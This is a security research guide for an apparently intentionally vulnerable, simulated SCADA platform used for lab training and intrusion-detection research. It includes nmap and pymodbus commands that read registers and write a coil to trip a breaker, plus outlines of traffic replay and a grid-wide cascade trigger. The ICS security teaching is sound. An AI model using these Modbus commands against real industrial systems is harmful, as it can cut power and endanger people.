# Security Research Guide

> ⚠️ **WARNING**: Use only in isolated lab or test environments. Never target production systems. All activities should comply with applicable laws and authorized testing policies.

## Overview

The SCADA Platform intentionally exposes realistic security vulnerabilities for research and education:

- **Unauthenticated Modbus TCP** (S7-200 legacy mode) on ports 5020–5041
- **Cleartext industrial protocols** for traffic analysis
- **No rate limiting** on Modbus connections
- **Full transaction logging** to enable detection research

---

## Attack Scenarios

### 1. Unauthorized Modbus Control

```bash
# Discover Modbus-enabled nodes
nmap -p 5020-5041 <target-ip>

# Read all registers from SUB-001
python -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('<target-ip>', port=5030)
c.connect()
r = c.read_holding_registers(0, 10, unit=3)
print(r.registers)
c.close()
"

# Trip a breaker (coil 0 = False)
python -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('<target-ip>', port=5030)
c.connect()
c.write_coil(0, False, unit=3)
c.close()
"
```

### 2. Data Exfiltration

- Read all holding registers (40001–40010) from all 7 nodes
- Map the complete operational state of the simulated grid
- See [MODBUS_REFERENCE.md](MODBUS_REFERENCE.md) for the full register map

### 3. Man-in-the-Middle / Traffic Analysis

- Capture unencrypted Modbus TCP traffic with Wireshark or tcpdump
- Replay captured control commands
- Analyze protocol structure and timing

### 4. Cascade Triggering

- Trip both GEN-001 and GEN-002 breakers simultaneously
- Observe full grid de-energization cascade in admin dashboard
- 83,000 simulated consumers lose power
- Cascade event recorded in the `cascade_events` database table

### 5. Anomaly Detection Research

- All Modbus transactions are logged in the `modbus_transactions` table with source IP
- Generate labelled benign vs. malicious traffic datasets
- Use logs to train and evaluate intrusion detection systems (IDS)

---

## Database Tables for Research

| Table                 | Content                                           |
|-----------------------|---------------------------------------------------|
| `modbus_transactions` | Every Modbus read/write with source IP and timestamp |
| `security_events`     | Unauthorized access attempts and anomalies        |
| `alarms`              | All alarm events with priority level              |
| `cascade_events`      | Cascade trigger/restore events with impact count  |

```bash
# Connect to database
docker exec -it scada_timescaledb psql -U scada -d scadadb

# View recent Modbus activity
SELECT node_id, function_code, address, value, client_ip, timestamp
FROM modbus_transactions
ORDER BY timestamp DESC
LIMIT 20;
```

---

## Responsible Use

This platform is provided for:
- Academic research in ICS/SCADA security
- Red team training in isolated environments
- Developing and testing anomaly detection tools
- Education on industrial protocol vulnerabilities

**Do not** connect this system to production networks or expose Modbus ports to the internet.
